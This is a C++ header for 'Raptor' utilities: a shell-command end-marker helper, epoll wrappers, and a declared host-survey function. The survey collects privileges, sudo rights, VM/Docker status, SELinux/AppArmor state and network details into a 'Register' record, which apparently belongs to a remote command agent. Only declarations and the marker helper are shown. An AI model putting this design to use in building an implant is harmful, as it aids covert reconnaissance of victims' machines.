#pragma once

#include <cstdint>
#include <format>
#include <stdexcept>
#include <sys/epoll.h>
#include "common/register.hpp"

namespace Raptor::Utils {

    inline std::string makeEndMarker(uint32_t id) {
        return std::format(" ; printf '\\0END:{}:%s:%s\\0\\n' \"$?\" \"$PWD\"\n", id);
    }


/**
 * @brief Puts a file descriptor into non-blocking mode (O_NONBLOCK).
 *
 * Reads the current flags with F_GETFL then ORs in O_NONBLOCK via F_SETFL.
 *
 * @param fd  Open file descriptor to modify.
 * @throws std::runtime_error if either fcntl call fails, with the
 *         syscall name, fd value, and errno message embedded.
 */
void setNonBlocking(int fd);


/**
 * @brief Registers a file descriptor with an epoll instance (EPOLL_CTL_ADD).
 *
 * @param epollfd  The epoll file descriptor returned by epoll_create1().
 * @param fd       The file descriptor to monitor.
 * @param events   Bitmask of EPOLL* flags (e.g. EPOLLIN | EPOLLET).
 * @return true    on success.
 * @return false   on failure — logs "[epoll] ADD fd=N events=0xN failed: ..."
 *                 to stderr, does not throw.
 */
bool addEpoll(int epollfd, int fd, uint32_t events) noexcept;

/**
 * @brief Re-arms a one-shot fd or updates the event mask (EPOLL_CTL_MOD).
 *
 * Must be called after every EPOLLONESHOT event fires, and whenever the
 * desired event mask changes (e.g. switching from read-wait to write-wait).
 *
 * @param epollfd  The epoll file descriptor.
 * @param fd       The already-registered file descriptor to update.
 * @param events   New bitmask of EPOLL* flags.
 * @return true    on success.
 * @return false   on failure — logs "[epoll] MOD fd=N events=0xN failed: ..."
 *                 to stderr, does not throw.
 */
bool rearm(int epollfd, int fd, uint32_t events) noexcept;

/**
 * @brief Removes a file descriptor from an epoll instance (EPOLL_CTL_DEL).
 *
 * Safe to call before ::close(fd); always call this before closing a
 * registered descriptor to avoid stale-fd events.
 *
 * @param epollfd  The epoll file descriptor.
 * @param fd       The file descriptor to deregister.
 * @return true    on success.
 * @return false   on failure — logs "[epoll] DEL fd=N failed: ..." to stderr,
 *                 does not throw.
 */
bool delEpoll(int epollfd, int fd) noexcept;

/**
 * @brief Collects system information and fills a Register structure.
 *
 * Reads from /proc, /sys, uname(2), sysinfo(2), statvfs(2), getifaddrs(3),
 * and environment variables.  All fields that cannot be determined are left
 * zero-initialised; no field is ever left unterminated.
 *
 * This function never throws — failures are silently skipped so the caller
 * always receives a best-effort snapshot.
 *
 * Fields populated:
 *  - Identity   : hostname, username, homeDir, shell, pid, processPath/Name
 *  - Privileges : isAdmin, isSudoer
 *  - OS         : os, osVersion, kernelVersion, arch
 *  - Hardware   : cpu, cpuCores, ramBytes, diskTotal/FreeBytes, uptimeSeconds
 *  - Network    : internalIp, internalIp2, macAddress, defaultGateway, dnsServer
 *  - Environment: domain, isDomainJoined, isDocker, isVM, vmType
 *  - Security   : selinuxEnabled, apparmorEnabled, isProxy, proxyUrl
 *  - Locale     : timezone, locale
 *
 * @return A fully populated Register value (returned by value; zero-cost
 *         with NRVO).
 */
[[nodiscard]] Raptor::Common::Register collect() noexcept;

} // namespace Raptor::Utils
